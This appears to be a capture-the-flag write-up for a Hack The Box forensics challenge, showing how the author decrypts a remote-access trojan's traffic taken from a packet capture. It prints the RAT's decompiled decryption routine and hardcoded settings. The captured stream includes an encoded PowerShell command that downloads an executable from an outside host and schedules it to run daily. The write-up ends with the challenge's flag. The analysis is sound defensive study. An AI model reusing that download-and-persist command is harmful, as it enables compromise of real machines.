forensics_data_siege
> "It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city's messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts."

#### Difficulty: medium

We are given a zip file that contains a pcap. I opened this in Wireshark and skimmed through the lines and it looked like a malicious exe was downloaded by the user. I exported this exe using Wireshark's Export Objects function. I also noticed a TCP exchange that happened afterwards but base64-decoding these yielded garbage data, signifying some sort of encryption, so it was time to analyze the exe.

I tried decompiling it with IDA Free, Radare2, and Ghidra, but no dice (perhaps I just don't know how to use these). I remembered that there is a decompiler from JetBrains, so I gave it a try.
Using JetBrains dotPeek (not sponsored), I was able to see the pretty much fully decompiled code. I found the `Decrypt` function:

<details><summary>Decrypt Function</summary>

```
    public static string Decrypt(string cipherText)
    {
      try
      {
        string encryptKey = Constantes.EncryptKey;
        byte[] buffer = Convert.FromBase64String(cipherText);
        using (Aes aes = Aes.Create())
        {
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[13]
          {
            (byte) 86,
            (byte) 101,
            (byte) 114,
            (byte) 121,
            (byte) 95,
            (byte) 83,
            (byte) 51,
            (byte) 99,
            (byte) 114,
            (byte) 51,
            (byte) 116,
            (byte) 95,
            (byte) 83
          });
          aes.Key = rfc2898DeriveBytes.GetBytes(32);
          aes.IV = rfc2898DeriveBytes.GetBytes(16);
          using (MemoryStream memoryStream = new MemoryStream())
          {
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
            {
              cryptoStream.Write(buffer, 0, buffer.Length);
              cryptoStream.Close();
            }
            cipherText = Encoding.Default.GetString(memoryStream.ToArray());
          }
        }
        return cipherText;
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        Console.WriteLine("Cipher Text: " + cipherText);
        return "error";
      }
    }
```
</details>

Looks like it's using a static salt (`Very_S3cr3t_S` when converted) and thankfully the key is stored as a constant:

```
    private const int _SW_HIDE = 0;
    private const int _SW_SHOW = 5;
    private static string _ip = "10.10.10.21";
    private static int _port = 1234;
    private static int _screenShotSpeed = 100;
    private static string _version = "0.1.6.1";
    private static string _encryptKey = "VYAemVeO3zUDTL6N62kVA";
    private static Size _defaultCompressionSize = new Size(1280, 720);
    private static string _separator = "|";
    private static string _special_Separator = "¦";
    private static Thread _spy;
```

I didn't want to load up a C# environment locally so I just accessed an [online compiler](https://www.programiz.com/csharp-programming/online-compiler/) as it seemed like, except for the EZRAT client, it's using standard library imports. I just copied all the imports and hardcoded the encryption key:

<details><summary>Online Compiler Code</summary>

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

public class HelloWorld
{
    public static void Main(string[] args)
    {
        Console.WriteLine(Decrypt("payload here"));
    }
    
    public static string Decrypt(string cipherText)
    {
      try
      {
        string encryptKey = "VYAemVeO3zUDTL6N62kVA";
        byte[] buffer = Convert.FromBase64String(cipherText);
        using (Aes aes = Aes.Create())
        {
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[13]
          {
            (byte) 86,
            (byte) 101,
            (byte) 114,
            (byte) 121,
            (byte) 95,
            (byte) 83,
            (byte) 51,
            (byte) 99,
            (byte) 114,
            (byte) 51,
            (byte) 116,
            (byte) 95,
            (byte) 83
          });
          aes.Key = rfc2898DeriveBytes.GetBytes(32);
          aes.IV = rfc2898DeriveBytes.GetBytes(16);
          using (MemoryStream memoryStream = new MemoryStream())
          {
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
            {
              cryptoStream.Write(buffer, 0, buffer.Length);
              cryptoStream.Close();
            }
            cipherText = Encoding.Default.GetString(memoryStream.ToArray());
          }
        }
        return cipherText;
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        Console.WriteLine("Cipher Text: " + cipherText);
        return "error";
      }
    }    
}
```
</details>

Now for the actual things to decrypt, I just passed the output from the TCP stream mentioned earlier to this function though I also had to do some cleanup as the messages from the client all had an extraneous pattern (usually a number and a dot) that had to be removed.

<details><summary>TCP Stream Strings</summary>

```
24.1BhuY4/niTopIBHAN6vvmQ==gs1pJD3U5aold1QaI/LdE+huVKxpC/azbuWUTstbgrbAU9zWdG7mtO0k+T9Mr0X8OBKR254z6toIOEZjd4PACN8tD+nT2n3Pun5DAbmX31vvI+BHavd4pDHEo26YKaUw24.F7fKMiKsoErWh0rg6Tr6kQ==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44.x08eb7N+5Ky5cV2hhL4iA1jaGmy6b+b4RjhY5no27vg=3a42oeqqUlDFRMc0fU2izQ==24.kiEDfJZYAB1sMzIdb5JF5Q==G4zEKBYS3iw2EN5dwLm6+/uQktBYty4nNBdsBxIqyb8=620.ZKlcDuS6syl4/w1JGgzkYxeaGTSooLkoI62mUeJh4hZgRRytOHq8obQ7o133pBW7BilbKoUuKeTvXi/2fmd4v+gOO/E6A0DGMWiW2+XZ+lkDa97VsbxXAwm0zhunRyBXHuo8TFbQ3wFkFtA3SBFDe+LRYQFB/Kzk/HX/EomfOj2aDYRGYBCHiGS70BiIC/gyNOW6m0xTu1oZx90SCoFel95v+vi8I8rQ1N6Dy/GPMuhcSWAJ8M9Q2N7fVEz92HWYoi8K5Zvge/7REg/5GKT4pu7KnnFCKNrTp9AqUoPuHm0cWy9J6ZxqwuOXTR8LzbwbmXohANtTGso6Dqbih7aai57uVAktF3/uK5nN7EgMSC0ZsUclzPZjm0r4ITE2HtBrRXJ78cUfIbxd+dIDBGts7IuDfjr0qyXuuzw+5o8pvKkTemvTcNXzNQbSWj+5tTxxly0Kgxi5MVT0ecyJfNfdZG0slqYHKaqJCZm6ShfvGRFsglKmenBB274sBdkVqIRtodB8dD1AM1ZQQX1MBMGDeCwFqc+ahch0x375U6Ekmvf2fzCZ/IaHOHBc8p5se1oNMRbIqcJaundh5cuYL/h8p/NPVTK9veu3Qihy310wkjg=uJ2fWsTba0ORtkn2zNOzNQ==64.Hpn7/+8bhbPtNrDOPNmi90fpHYG70U3N1UJbbLuVBPamvpijHsmWE4/C/Xgrzg7vMVLZZEXaiYxnXr4paESBd7S7kqQMujOq/n6jsr5eBfaDCRSXQMtNa1dLe3iGWvh7qabw+CXRiYtv1VHJNJidUuS5dbMYUK26hJJQJ9crfNBsoaekpIiFxGeZoDM9dIGHSWDHEUuptpB4SIXQZXwdKtL3TAQk/zm+6EXk6xVZEyI0fkymbSGz9fay/vvTLIQhFqVhNnPx30QiLOBtNvGDJzMjKuzngH8Vsv1VhYqKS/vCW2fN2knJRy9RuVyXDzft4FYQRfWCnyGXam+TmI6EKVzEgllOcRlfwit7elWhLgBAnJY/t8AMYHuZSdZE0l7t2MNtm4CRRIdUf9b2v0Z0rxEy7hWWJEkD42OdyVkP8oudjA6w9vqsUkCjKnKw5rXr5XKjzuBwziKeX7K2QkY9x8v5ptrlpO908OPzyPo27xUAY+YrxYubbEpwYyDbVmHETS3Yssgd9IYB1doA0QoI9bYzx1vDdiwtgjoNJlIEnYs=88.3BQcww/tA6Mch9bMGZk8uuPzsNLBo8I5vfb3YfHJldljnkES0BVtObZlIkmaryDdqd0me6xCOs+XWWF+PMwNjQ==zVmhuROwQw02oztmJNCvd2v8wXTNUWmU3zkKDpUBqUON+hKOocQYLG0pOhERLdHDS+yw3KU6RD9Y4LDBjgKeQnjml4XQMYhl6AFyjBOJpA4UEo2fALsqvbU4Doyb/gtg24.FdbfR3mrvbcyK6+9WQcR5A==bsi2k0APOcHI6TMDnO+dBg==24.Q2zJpoA5nGWWiB2ec1v0aQ==24.uib3VErvtueXl08f8u4nfQ==24.uib3VErvtueXl08f8u4nfQ==YdPbtpi8M11upjnkrlr/y5tLDKdQBiPWbkgDSKmFCWusn5GFkosc8AYU2M7C1+xEHdMgJ3is+7WW099YpCIArFhDNKRZxAM9GPawxOMI+w3/oimWm9Y/7pjGbcpXcC+2X1MTla0M2nvzsIKPtGeSku4npe8pPGS+fbxwXOkZ5kfZgaN33Nn+jW61VP49dslxvH47v97udYEHm8IO+f7OhCfzetKiulh3PN4tlzIB5I+PBdtDbOXnxHj+ygGW25xjyNh1Fbm2kweHL+qlFmPPtyapWYZMd85tPmRYBwevpvu9LO2tElYAcmFJwG8xc9lc9ca03ha2rIh3ioSNws9grVwFW3SjdcyqoGhcN8cr0FPgu2Q0OVKMdYprjRdEEeptdcBMybcYhHs9jcNKZu0R/pgiSbCPuONN67uF2Jw/9Ss=YdPbtpi8M11upjnkrlr/y5tLDKdQBiPWbkgDSKmFCWusn5GFkosc8AYU2M7C1+xEHdMgJ3is+7WW099YpCIArFhDNKRZxAM9GPawxOMI+w3/oimWm9Y/7pjGbcpXcC+2X1MTla0M2nvzsIKPtGeSku4npe8pPGS+fbxwXOkZ5kfZgaN33Nn+jW61VP49dslxvH47v97udYEHm8IO+f7OhCfzetKiulh3PN4tlzIB5I+PBdtDbOXnxHj+ygGW25xjyNh1Fbm2kweHL+qlFmPPtyapWYZMd85tPmRYBwevpvu9LO2tElYAcmFJwG8xc9lc9ca03ha2rIh3ioSNws9grVwFW3SjdcyqoGhcN8cr0FPgu2Q0OVKMdYprjRdEEeptdcBMybcYhHs9jcNKZu0R/pgiSbCPuONN67uF2Jw/9Ss=44.ghck5X9x6380mB3aBi+AY7QIEnzhNuF/pDMz9iWssDg=sTRnTjJH0S7yIPUVwWFsNxwMOMxdNiq9OXDRFrCwpPF2UhkfUF0Mw0/YGLpHMCfw44.zz2ELWwzZYbeI1idIdhMwLyqZ6yatlXwAFOfNGy5QVg=powershell.exe -encoded "CgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AdwBpAG4AZABvAHcAcwBsAGkAdgBlAHUAcABkAGEAdABlAHIALgBjAG8AbQAvADQAZgB2AGEALgBlAHgAZQAiACwAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIAKQAKAAoAJABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIACgAKACQAdAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0ARABhAGkAbAB5ACAALQBBAHQAIAAyADoAMAAwAEEATQAKAAoAJABzAGUAdAB0AGkAbgBnAHMAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFMAZQB0AHQAaQBuAGcAcwBTAGUAdAAKAAoAIwAgADMAdABoACAAZgBsAGEAZwAgAHAAYQByAHQAOgAKAAoAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgAwAHIAMwBkAF8AMQBuAF8ANwBoADMAXwBoADMANABkAHEAdQA0AHIANwAzAHIANQB9ACIAIAAtAEEAYwB0AGkAbwBuACAAJABhAGMAdABpAG8AbgAgAC0AVAByAGkAZwBnAGUAcgAgACQAdAByAGkAZwBnAGUAcgAgAC0AUwBlAHQAdABpAG4AZwBzACAAJABzAGUAdAB0AGkAbgBnAHMACgA="
AcABkAGEAdABlAHIALgBjAG8AbQAvADQAZgB2AGEALgBlAHgAZQAiACwAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIAKQAKAAoAJABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIACgAKACQAdAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0ARABhAGkAbAB5ACAALQBBAHQAIAAyADoAMAAwAEEATQAKAAoAJABzAGUAdAB0AGkAbgBnAHMAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFMAZQB0AHQAaQBuAGcAcwBTAGUAdAAKAAoAIwAgADMAdABoACAAZgBsAGEAZwAgAHAAYQByAHQAOgAKAAoAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgAwAHIAMwBkAF8986ztFYX3Ksf2pHdywqpLg==
```

</details>


Running the Decrypt function resulted in the three pieces of the flag, which I then combined:

`HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}`